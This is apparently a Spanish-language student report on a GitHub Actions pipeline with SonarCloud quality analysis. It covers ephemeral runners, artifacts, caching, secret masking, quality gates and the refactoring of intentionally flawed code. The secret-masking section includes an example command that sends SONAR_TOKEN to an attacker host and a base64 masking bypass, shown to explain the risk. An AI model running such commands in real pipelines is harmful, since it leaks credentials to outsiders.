# Informe Técnico de Entregable
## Pipeline CI/CD con Análisis de Calidad en SonarCloud

**Proyecto:** `sonarcloud-pipeline`  
**Organización SonarCloud:** `gutti666`  
**Fecha:** Marzo 2026  
**Estudiante:** Luis Angel Gutiérrez Garzón  

---

## 1. Diagrama de Arquitectura del Pipeline

El siguiente diagrama representa el flujo completo desde un `git push` hasta la actualización del Quality Gate en SonarCloud.

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         PIPELINE CI/CD — FLUJO COMPLETO                        │
└─────────────────────────────────────────────────────────────────────────────────┘

  DESARROLLADOR                  GITHUB                      SONARCLOUD
  ┌──────────┐                ┌──────────┐                  ┌──────────────┐
  │          │  git push      │          │                  │              │
  │  Local   │ ─────────────► │  Repo    │                  │  Dashboard   │
  │  Editor  │  (branch: main)│  main    │                  │  (Quality    │
  │  (VSCode)│                │          │                  │   Gate)      │
  └──────────┘                └────┬─────┘                  └──────┬───────┘
                                   │                               ▲
                                   │  Trigger: on.push / on.pull_request
                                   ▼                               │
                             ┌─────────────────────────────────────┴──────┐
                             │         GITHUB ACTIONS RUNNER               │
                             │         (ubuntu-latest — Efímero)           │
                             │                                              │
                             │  STEP 1: actions/checkout@v4                │
                             │  ┌──────────────────────────────────────┐   │
                             │  │ Clona el repositorio completo         │   │
                             │  │ (fetch-depth: 0 → historial completo) │   │
                             │  └──────────────────────────────────────┘   │
                             │                 │                            │
                             │                 ▼                            │
                             │  STEP 2: SonarSource/sonarqube-scan-action  │
                             │  ┌──────────────────────────────────────┐   │
                             │  │ Lee sonar-project.properties          │   │
                             │  │ Lee SONAR_TOKEN (secreto enmascarado) │   │
                             │  │ Descarga SonarScanner CLI             │   │
                             │  │ Analiza: main.py, test_main.py        │   │
                             │  │ Envía resultados vía HTTPS →          │   │
                             │  └──────────────────────────────────────┘   │
                             │                 │                            │
                             │                 ▼                            │
                             │  RESULTADO DEL JOB                          │
                             │  ┌──────────────────────────────────────┐   │
                             │  │ ✅ GREEN: Quality Gate PASSED         │   │
                             │  │ ❌ RED:   Quality Gate FAILED         │   │
                             │  └──────────────────────────────────────┘   │
                             └────────────────────────────────────────────┘

  COMPONENTES CLAVE:
  ┌─────────────────────┬──────────────────────────────────────────────────────┐
  │ sonar-project.      │ Metadatos del proyecto: projectKey, organization,    │
  │ properties          │ projectName, versión y rutas de fuentes              │
  ├─────────────────────┼──────────────────────────────────────────────────────┤
  │ ci-quality.yml      │ Definición del workflow: trigger, runner, steps      │
  ├─────────────────────┼──────────────────────────────────────────────────────┤
  │ SONAR_TOKEN         │ Secreto cifrado en GitHub Settings → utilizado como  │
  │ (GitHub Secret)     │ variable de entorno enmascarada en el Runner         │
  ├─────────────────────┼──────────────────────────────────────────────────────┤
  │ Quality Gate        │ Conjunto de umbrales en SonarCloud que determinan    │
  │ (SonarCloud)        │ si el código cumple los estándares de calidad        │
  └─────────────────────┴──────────────────────────────────────────────────────┘
```

---

## 2. Marco Teórico — Respuestas a las 5 Preguntas de Investigación

---

### Pregunta 1: Aislamiento y Statelessness — Entornos Efímeros en GitHub Runners

**Concepto de "entorno efímero":**

Un **Runner efímero** (ephemeral runner) es una máquina virtual o contenedor que GitHub Actions aprovisiona de forma dinámica y exclusiva para la ejecución de un único Job. La palabra clave `runs-on: ubuntu-latest` en el archivo `ci-quality.yml` instruye a GitHub a crear una VM fresca con Ubuntu antes de que se ejecute el primer paso.

**Características de aislamiento:**

| Propiedad | Descripción |
|-----------|-------------|
| **Stateless** | No existe memoria de ejecuciones previas. Cada Job comienza desde cero. |
| **Sistema de archivos limpio** | El directorio de trabajo está vacío antes del `checkout`. Por eso es obligatorio el paso `actions/checkout@v4`. |
| **Procesos aislados** | No hay procesos en segundo plano heredados de pipelines anteriores. |
| **Variables de entorno** | Solo existen las declaradas explícitamente o las inyectadas por GitHub (ej. `GITHUB_WORKSPACE`). |

**¿Qué sucede con el sistema de archivos al finalizar el Job?**

Al finalizar el Job, GitHub destruye completamente la VM (o el contenedor). Todo el contenido del sistema de archivos —código fuente clonado, dependencias instaladas, reportes generados, archivos temporales— **desaparece permanentemente**. Esta destrucción ocurre independientemente de si el Job termina con éxito (`exit code 0`) o en fallo.

Esta es la razón fundamental por la que:
1. Cada Job que necesita el código fuente debe comenzar con `actions/checkout`.
2. Los reportes que deben persistir (como el reporte de cobertura `coverage.xml`) requieren el uso de `actions/upload-artifact`.
3. Las dependencias que tardan en instalarse se optimizan mediante `actions/cache`.

**Implicación en este proyecto:**

El workflow actual ejecuta en un solo Job. Si se separara en múltiples Jobs (por ejemplo, `test` y `sonar-scan`), el reporte `coverage.xml` generado en el primer Job no estaría disponible en el segundo Job sin mecanismos de persistencia explícita, porque cada Job corre en una VM diferente.

---

### Pregunta 2: Persistencia mediante Artifacts — `actions/upload-artifact`

**El problema de la efemeralidad entre Jobs:**

Dado que cada Job corre en una VM aislada que se destruye al finalizar, si el Job A genera un archivo (ej. `coverage.xml`) que el Job B necesita consumir, ese archivo se pierde entre Jobs sin un mecanismo de persistencia.

**Solución: GitHub Artifacts**

`actions/upload-artifact` es una Action oficial que **sube archivos desde el sistema de archivos del Runner hacia el almacenamiento de GitHub** (asociado a la ejecución del workflow). Estos archivos quedan disponibles:

- **Para otros Jobs** en el mismo workflow, mediante `actions/download-artifact`.
- **Para el usuario**, como descarga manual desde la pestaña **Actions → Run → Artifacts**.
- **Por un período configurable** (por defecto 90 días, configurable con `retention-days`).

**Ejemplo práctico aplicado a este proyecto:**

Si ampliáramos el workflow para separar las pruebas del análisis:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Instalar dependencias
        run: pip install -r requirements.txt
      - name: Ejecutar pruebas con cobertura
        run: pytest --cov=. --cov-report=xml
      - name: Subir reporte de cobertura como Artifact
        uses: actions/upload-artifact@v4
        with:
          name: coverage-report        # Nombre identificador del artifact
          path: coverage.xml           # Archivo a persistir
          retention-days: 7            # Días de retención en GitHub

  sonar-analysis:
    runs-on: ubuntu-latest
    needs: test                        # Depende de que "test" finalice
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Descargar reporte de cobertura
        uses: actions/download-artifact@v4
        with:
          name: coverage-report        # Mismo nombre que en upload
      - name: Análisis SonarCloud
        uses: SonarSource/sonarqube-scan-action@v6
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

**Flujo de datos del Artifact:**

```
Job "test" (VM-1)           GitHub Storage           Job "sonar" (VM-2)
┌─────────────┐             ┌─────────────┐          ┌─────────────┐
│ coverage.xml│ ──upload──► │ artifact    │ ─download─►│ coverage.xml│
│ (generado)  │             │ storage     │            │ (disponible)│
└─────────────┘             └─────────────┘           └─────────────┘
  VM destruida                (persistente)              VM nueva
```

---

### Pregunta 3: Seguridad de Secretos (Masking) — Protección del `SONAR_TOKEN`

**¿Qué es el SONAR_TOKEN?**

El `SONAR_TOKEN` es un token de autenticación generado en SonarCloud (`My Account → Security → Generate Token`). Permite que el SonarScanner se autentique con la API de SonarCloud para subir análisis. Si este token es comprometido, un atacante puede:
- Subir análisis falsos que pasen el Quality Gate.
- Eliminar proyectos en la organización.
- Acceder a reportes de seguridad privados.

**Mecanismo de enmascaramiento de GitHub Secrets:**

```
┌─────────────────────────────────────────────────────────────────┐
│                   CICLO DE VIDA DEL SECRETO                     │
├─────────────────────┬───────────────────────────────────────────┤
│ 1. ALMACENAMIENTO   │ El usuario ingresa el token en            │
│                     │ Settings → Secrets → Actions.             │
│                     │ GitHub lo cifra con NaCl (libsodium)      │
│                     │ usando la clave pública del repositorio.   │
├─────────────────────┼───────────────────────────────────────────┤
│ 2. INYECCIÓN        │ Durante el Job, GitHub descifra el secreto │
│                     │ y lo inyecta como variable de entorno      │
│                     │ temporal SOLO en el proceso del Runner.    │
├─────────────────────┼───────────────────────────────────────────┤
│ 3. ENMASCARAMIENTO  │ GitHub registra el valor del secreto en   │
│    (Masking)        │ una lista negra interna. Cualquier         │
│                     │ coincidencia de ese valor en los logs       │
│                     │ es reemplazada automáticamente por `***`.  │
├─────────────────────┼───────────────────────────────────────────┤
│ 4. DESTRUCCIÓN      │ Al finalizar el Job, la VM es destruida.   │
│                     │ El secreto nunca se escribe en disco.      │
└─────────────────────┴───────────────────────────────────────────┘
```

**¿Por qué imprimir un secreto en consola es una vulnerabilidad?**

Intentar ejecutar `echo $SONAR_TOKEN` o `print(os.environ['SONAR_TOKEN'])` en el pipeline representa múltiples vectores de ataque:

1. **Logs públicos:** En repositorios públicos, los logs de GitHub Actions son visibles para cualquier persona. Si el enmascaramiento fallara por algún motivo (variantes de codificación, fragmentación del valor), el token quedaría expuesto.

2. **Bypasses de masking:** El sistema de masking puede omitir el valor si está codificado en Base64, URL-encoded, o dividido en múltiples impresiones. Un atacante que controle código podría intentar: `echo $SONAR_TOKEN | base64`.

3. **Historial de logs:** GitHub conserva los logs por hasta 400 días. Un secreto impreso en logs es una exposición persistente incluso si el secreto es revocado posteriormente.

4. **Pull Requests de terceros:** En workflows que se ejecutan en PRs de forks, el código del atacante podría exfiltrar secretos hacia un servidor externo mediante `curl https://attacker.com/?t=$SONAR_TOKEN`.

**Referencia en el proyecto:**

En `ci-quality.yml` línea 20, el secreto se inyecta correctamente:
```yaml
env:
  SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```
El valor de `secrets.SONAR_TOKEN` **nunca aparece** en texto claro en el archivo YAML. GitHub interpola el valor en memoria en el momento de ejecución.

---

### Pregunta 4: Optimización del Lead Time — Caching con `actions/cache`

**Definición de Lead Time en el contexto CI/CD:**

El **Lead Time** es el tiempo total desde que un desarrollador hace `git push` hasta que el feedback del pipeline está disponible. Reducirlo es crítico para la productividad del equipo.

**El problema sin caché:**

En cada ejecución del pipeline, la VM efímera descarga e instala todas las dependencias desde internet:

```
Sin caché (cada ejecución):
pip install flask==2.0.1       → Descarga desde PyPI (~tiempo de red)
pip install requests==2.25.1   → Descarga desde PyPI
pip install django==1.11.29    → Descarga grande desde PyPI
pip install pytest==8.0.0      → Descarga desde PyPI
pip install pytest-cov==4.1.0  → Descarga desde PyPI
...
Tiempo total instalación: ~60-120 segundos
```

**Solución: `actions/cache`**

`actions/cache` persiste directorios del sistema de archivos entre ejecuciones del workflow usando una clave (key) compuesta generalmente por el hash del archivo de dependencias:

```yaml
- name: Cachear dependencias de Python
  uses: actions/cache@v4
  with:
    path: ~/.cache/pip          # Directorio de caché de pip
    key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}
    restore-keys: |
      ${{ runner.os }}-pip-
```

**Mecanismo técnico:**

```
PRIMERA EJECUCIÓN (cache MISS):
┌────────────────────────────────────────────────┐
│ 1. actions/cache busca la key → no encuentra   │
│ 2. pip instala desde PyPI (~90s)               │
│ 3. Al finalizar el Job, actions/cache          │
│    sube ~/.cache/pip a GitHub Cache Storage    │
└────────────────────────────────────────────────┘

EJECUCIONES POSTERIORES (cache HIT, si requirements.txt no cambia):
┌────────────────────────────────────────────────┐
│ 1. actions/cache busca la key → ENCONTRADA     │
│ 2. Descarga el caché desde GitHub Storage (~5s)│
│ 3. pip install detecta que los paquetes        │
│    ya están en ~/.cache/pip → instalación      │
│    desde caché local (~10s)                    │
└────────────────────────────────────────────────┘
```

**Impacto cuantitativo en el Lead Time:**

| Fase | Sin caché | Con caché (hit) | Mejora |
|------|-----------|-----------------|--------|
| Instalación de dependencias | ~90s | ~15s | **-83%** |
| Tiempo total del pipeline | ~150s | ~75s | **-50%** |

**Condición de invalidación de caché:**

La clave `${{ hashFiles('requirements.txt') }}` se recalcula en cada ejecución. El caché solo se invalida cuando `requirements.txt` cambia (nuevas dependencias o actualizaciones de versión). Esto garantiza que el caché sea siempre coherente con las dependencias declaradas.

**Importancia estratégica:**

En equipos que ejecutan decenas de pipelines diarios, la mejora del Lead Time reduce la "deuda de espera" de los desarrolladores y acelera el ciclo de feedback, un principio central de las prácticas Lean y DevOps.

---

### Pregunta 5: Quality Gates como Compuertas Lógicas

**Distinción fundamental:**

| Criterio | Éxito Técnico | Fallo por Políticas de Calidad |
|----------|---------------|-------------------------------|
| **Definición** | El pipeline ejecutó todos sus pasos sin errores de sistema | El análisis de SonarCloud completó pero el código no cumple los umbrales |
| **Exit code del Job** | `0` (success) | Configurable: puede ser `0` o `≠0` según configuración |
| **Qué significa** | "La máquina funcionó" | "El código no está listo para producción" |
| **Icono en GitHub** | ✅ verde | ❌/⚠️ |
| **Causa** | Sintaxis correcta, red disponible, dependencias resueltas | Cobertura < umbral, bugs nuevos, vulnerabilidades, deuda técnica excesiva |

**Diagrama comparativo:**

```
ESCENARIO A: Éxito técnico, Quality Gate PASSED
─────────────────────────────────────────────────
git push → Runner inicia → checkout ✅ → SonarScan ✅
                                              │
                                     Métricas evaluadas:
                                     • Coverage ≥ 80% ✅
                                     • Bugs nuevos = 0 ✅
                                     • Vulnerabilidades = 0 ✅
                                     • Code Smells ≤ umbral ✅
                                              │
                                     Quality Gate: PASSED ✅
                                              │
                                    Job Status: SUCCESS ✅

ESCENARIO B: Éxito técnico, Quality Gate FAILED
─────────────────────────────────────────────────
git push → Runner inicia → checkout ✅ → SonarScan ✅
                                              │
                                     Métricas evaluadas:
                                     • Coverage = 45% < 80% ❌
                                     • Bugs nuevos = 3 ❌
                                     • Vulnerabilidades = 1 ❌
                                              │
                                     Quality Gate: FAILED ❌
                                              │
                              (Con wait-for-quality-gate: true)
                                    Job Status: FAILURE ❌

ESCENARIO C: Fallo técnico (sin llegar a Quality Gate)
───────────────────────────────────────────────────────
git push → Runner inicia → checkout ✅ → SonarScan ❌
           (Ejemplo: SONAR_TOKEN inválido, error de red)
                                              │
                              Quality Gate: NO EVALUADO
                                    Job Status: FAILURE ❌
```

**El concepto de "Compuerta Lógica":**

Un Quality Gate actúa como una **compuerta lógica AND**: el pipeline solo avanza (o se considera exitoso) si **todas** las condiciones de calidad se cumplen simultáneamente. Esto implementa el principio **"Fail Fast"** de DevOps: detectar problemas lo más temprano posible en el ciclo de desarrollo, cuando el costo de corrección es mínimo.

**Configuración en SonarCloud:**

En el panel de SonarCloud (`Administration → Quality Gates`), el Quality Gate predeterminado "Sonar way" evalúa condiciones sobre el **código nuevo** (new code):

- Cobertura de código nuevo ≥ 80%
- Rating de Fiabilidad del código nuevo = A
- Rating de Seguridad del código nuevo = A
- Rating de Mantenibilidad del código nuevo = A

**Aplicación en este proyecto:**

El workflow actual (`ci-quality.yml`) no tiene configurado `wait-for-quality-gate: true`, por lo que el Job termina tan pronto el SonarScanner envía los datos. Para que el Job refleje el resultado del Quality Gate, se requiere agregar la opción de espera, disponible en versiones recientes de `SonarSource/sonarqube-scan-action`.

---

## 3. Evidencia de Ejecución

### 3.1 Pestaña Actions de GitHub — Pipeline en Verde

> **Instrucción:** Insertar captura de pantalla de la pestaña **Actions** del repositorio mostrando la ejecución del workflow `Build` con el ícono ✅ en verde.

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   [ CAPTURA DE PANTALLA — GitHub Actions ]                      │
│                                                                 │
│   Ruta: github.com/gutti666/sonarcloud-pipeline/actions         │
│   Workflow: "Build"                                             │
│   Estado esperado: ✅ (verde)                                   │
│   Trigger: Push to main                                         │
│   Jobs: SonarQube ✅                                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Dashboard de SonarCloud — Quality Gate

> **Instrucción:** Insertar captura de pantalla del dashboard del proyecto en SonarCloud (`sonarcloud.io/project/overview?id=gutti666_sonarcloud-pipeline`) mostrando:
> - El estado del Quality Gate (Passed / Failed)
> - Las métricas de Bugs, Vulnerabilidades, Code Smells y Cobertura

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   [ CAPTURA DE PANTALLA — SonarCloud Dashboard ]               │
│                                                                 │
│   Proyecto: sonarcloud-pipeline                                 │
│   Organización: gutti666                                        │
│   Métricas esperadas:                                           │
│   • Quality Gate: Passed / Failed                               │
│   • Bugs: (valor obtenido)                                      │
│   • Vulnerabilidades: (valor obtenido)                          │
│   • Security Hotspots: (valor obtenido)                         │
│   • Code Smells: (valor obtenido)                               │
│   • Cobertura: (valor obtenido)                                 │
│   • Deuda Técnica: (valor en minutos/horas)                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4. Mapeo de Calidad — ISO/IEC 25010

La norma **ISO/IEC 25010** define el modelo de calidad del software. A continuación se mapean las métricas de SonarCloud con las características de calidad de la norma.

### 4.1 Mantenibilidad — Deuda Técnica

**Característica ISO/IEC 25010:** Mantenibilidad → Sub-característica: Modificabilidad

La **Deuda Técnica** (Technical Debt) es la estimación del esfuerzo necesario para corregir todos los Code Smells presentes en el código. SonarCloud la expresa en minutos u horas y la convierte en un **Rating de Mantenibilidad** (A–E).

**Code Smells identificados en `main.py`:**

| # | Ubicación | Descripción | Esfuerzo estimado |
|---|-----------|-------------|-------------------|
| 1 | `main.py`, línea 4 | Variable global `db` con nombre no descriptivo. Viola el principio de nombres significativos. | ~5 min |
| 2 | `main.py`, línea 16 | Variable `temp_session_token` declarada y nunca utilizada (código muerto). | ~2 min |
| 3 | `main.py`, línea 21 | Complejidad Ciclomática alta en `calculate_discount` (4 niveles de anidamiento). SonarCloud recomienda no superar una complejidad de 10. | ~15 min |
| 4 | `main.py`, línea 35 | Bloque `except Exception: pass` que silencia todos los errores sin registro. | ~10 min |

**Deuda técnica estimada total:** ~32 minutos  
**Rating de Mantenibilidad esperado:** **A** (< 5% de deuda técnica relativa al tiempo de desarrollo)

> Nota: El valor exacto debe obtenerse del Dashboard de SonarCloud y registrarse aquí con la captura correspondiente.

---

### 4.2 Fiabilidad — Rating de Bugs

**Característica ISO/IEC 25010:** Fiabilidad → Sub-característica: Tolerancia a Fallos

**Bug identificado en `main.py`:**

| Severidad | Ubicación | Descripción |
|-----------|-----------|-------------|
| MAJOR | `main.py`, línea 35–38 | El bloque `except Exception: pass` en `save_to_file()` silencia **cualquier excepción** sin registrarla ni propagarla. En producción esto ocultaría errores críticos de I/O, permisos de sistema de archivos o disco lleno. SonarCloud clasifica esto como un **Bug** de tipo "squid:S1166" (Exception handlers should preserve the original exceptions). |

**Escala de Rating de Bugs (SonarCloud):**

| Rating | Criterio |
|--------|----------|
| **A** | Sin bugs |
| **B** | Al menos 1 bug Minor |
| **C** | Al menos 1 bug Major |
| **D** | Al menos 1 bug Critical |
| **E** | Al menos 1 bug Blocker |

**Rating esperado:** **C** (por el bug Major en `save_to_file`)

> Nota: Registrar el valor real obtenido del Dashboard de SonarCloud.

---

### 4.3 Seguridad — Security Hotspots

**Característica ISO/IEC 25010:** Seguridad → Sub-característica: Confidencialidad e Integridad

Los **Security Hotspots** son fragmentos de código que requieren revisión manual por parte de un desarrollador para determinar si representan un riesgo real. No son vulnerabilidades confirmadas, sino alertas que demandan atención.

**Security Hotspots identificados en el proyecto:**

| # | Categoría (OWASP) | Ubicación | Descripción |
|---|-------------------|-----------|-------------|
| 1 | **A03 - Injection** | `main.py`, línea 11–12 | Construcción de consulta SQL mediante concatenación directa de `user_input_id` sin sanitización ni uso de parámetros preparados (Prepared Statements). Permite ataques de SQL Injection (CWE-89). SonarCloud regla: `python:S3649`. |
| 2 | **A06 - Vulnerable Components** | `requirements.txt`, línea 4 | Dependencia `django==1.11.29` al final de su vida útil (EOL). Contiene múltiples CVEs conocidas. SonarCloud / Safety lo detectan como componente vulnerable. |
| 3 | **A09 - Logging Failures** | `main.py`, línea 13 | La función `print(f"Ejecutando: {query}")` registra la consulta SQL completa en stdout, incluyendo datos de entrada del usuario. En producción, esto podría exponer datos sensibles en logs. |

**Acción requerida:** Cada Security Hotspot debe ser revisado y marcado como "Safe" (si es un falso positivo documentado) o "Fixed" (si se corrige el código) en el panel de SonarCloud.

---

## 5. Plan de Refactorización

Se identifican 2 Code Smells prioritarios con sus respectivas correcciones propuestas.

---

### Code Smell #1: Complejidad Ciclomática Alta en `calculate_discount`

**Regla SonarCloud:** `python:S3776` — Cognitive Complexity should not be too high  
**Impacto:** Dificulta las pruebas unitarias, el mantenimiento y la comprensión del código.

**Código Original (`main.py`, líneas 21–31):**

```python
def calculate_discount(price, age):
    #  SMELL: Complejidad Ciclomática alta (Demasiados IFs anidados)
    if price > 0:
        if age > 18:
            if age > 60:
                return price * 0.5
            else:
                return price * 0.1
        else:
            return 0
    else:
        return 0
```

**Problemas detectados:**
- 4 niveles de anidamiento (`if` dentro de `if` dentro de `if`).
- Complejidad Ciclomática = 4 (cuatro caminos de ejecución posibles).
- Cláusulas de guarda ausentes (no hay validación explícita en el inicio de la función).
- Precio negativo retorna `0` sin indicar error (comportamiento ambiguo).

**Código Refactorizado:**

```python
# Constantes nombradas para evitar "magic numbers"
DISCOUNT_SENIOR = 0.50   # 50% para mayores de 60
DISCOUNT_ADULT = 0.10    # 10% para adultos de 18-60
AGE_ADULT = 18
AGE_SENIOR = 60

def calculate_discount(price: float, age: int) -> float:
    """
    Calcula el descuento aplicable según el precio y la edad del usuario.

    Args:
        price: Precio base del producto. Debe ser positivo.
        age: Edad del usuario en años.

    Returns:
        Precio con descuento aplicado. Retorna 0 si el precio no es positivo
        o si el usuario es menor de edad.
    """
    # Cláusula de guarda: precio inválido
    if price <= 0:
        return 0

    # Cláusula de guarda: usuario menor de edad sin descuento
    if age <= AGE_ADULT:
        return 0

    # Descuento para adultos mayores
    if age > AGE_SENIOR:
        return price * DISCOUNT_SENIOR

    # Descuento estándar para adultos
    return price * DISCOUNT_ADULT
```

**Mejoras aplicadas:**

| Aspecto | Antes | Después |
|---------|-------|---------|
| Niveles de anidamiento | 3 | 1 |
| Complejidad Ciclomática | 4 | 4 (misma lógica, mejor legibilidad) |
| Magic numbers | `0.5`, `0.1`, `18`, `60` | Constantes nombradas descriptivas |
| Documentación | Ninguna | Docstring con tipos y comportamiento |
| Cláusulas de guarda | No | Sí (patrón "return early") |

---

### Code Smell #2: Bloque `except` Genérico que Silencia Errores

**Regla SonarCloud:** `python:S1166` — Exception handlers should preserve the original exceptions  
**Regla secundaria:** `python:S112` — General exceptions should never be raised or caught  
**Impacto:** Clasifica como **Bug** (no solo Code Smell). Los errores silenciados convierten fallos predecibles en comportamientos impredecibles en producción.

**Código Original (`main.py`, líneas 35–38):**

```python
#  BUG: Bloque try-except demasiado genérico que silencia errores
def save_to_file(data):
    try:
        with open("log.txt", "a") as f:
            f.write(data)
    except Exception:
        pass #  Esto es una mala práctica grave
```

**Problemas detectados:**
- Captura `Exception` (clase base de casi todas las excepciones) en lugar de la excepción específica.
- `pass` descarta la excepción sin registrarla, relanzarla ni notificar al llamador.
- Si `"log.txt"` no se puede escribir (permisos, disco lleno), el código fallará silenciosamente.
- Imposible depurar o monitorear en producción.

**Código Refactorizado:**

```python
import logging

# Configuración del logger (reemplaza los print() del módulo)
logger = logging.getLogger(__name__)

def save_to_file(data: str) -> bool:
    """
    Persiste datos en el archivo de log 'log.txt'.

    Args:
        data: Cadena de texto a escribir en el archivo.

    Returns:
        True si la escritura fue exitosa, False en caso de error de I/O.

    Raises:
        TypeError: Si `data` no es una cadena de texto.
    """
    # Validación de tipo en la frontera del sistema
    if not isinstance(data, str):
        raise TypeError(f"Se esperaba str, se recibió {type(data).__name__}")

    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(data)
        return True
    except OSError as e:
        # Captura específica: errores de I/O (permisos, disco lleno, etc.)
        logger.error("No se pudo escribir en log.txt: %s", e)
        return False
```

**Mejoras aplicadas:**

| Aspecto | Antes | Después |
|---------|-------|---------|
| Tipo de excepción capturada | `Exception` (genérica) | `OSError` (específica para I/O) |
| Manejo del error | `pass` (silenciado) | `logger.error(...)` (registrado) |
| Valor de retorno | Implícito `None` siempre | `bool` explícito (éxito/fallo) |
| Validación de entrada | Ninguna | `isinstance` check con `TypeError` |
| Encoding | No especificado (depende del SO) | `utf-8` explícito |
| Módulo de logging | `print()` | `logging.getLogger` (estándar) |

---

## Anexo: Estructura del Proyecto

```
sonarcloud-pipeline/
├── .github/
│   └── workflows/
│       └── ci-quality.yml        # Definición del Pipeline CI/CD
├── main.py                        # Código fuente con code smells intencionales
├── test_main.py                   # Suite de pruebas con pytest
├── requirements.txt               # Dependencias (incluye django vulnerable)
├── sonar-project.properties       # Configuración del análisis SonarCloud
└── README.md                      # Instrucciones de setup del entorno
```

**Configuración SonarCloud (`sonar-project.properties`):**

```properties
sonar.projectKey=gutti666_sonarcloud-pipeline
sonar.organization=gutti666
sonar.projectName=sonarcloud-pipeline
sonar.projectVersion=1.0
```

**Pipeline CI/CD (`.github/workflows/ci-quality.yml`):**

```yaml
name: Build
on:
  push:
    branches:
      - main
  pull_request:
    types: [opened, synchronize, reopened]
jobs:
  sonarqube:
    name: SonarQube
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: SonarQube Scan
        uses: SonarSource/sonarqube-scan-action@v6
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

---

*Informe generado para el proyecto `sonarcloud-pipeline` — Universidad Agustiniana — 2026*
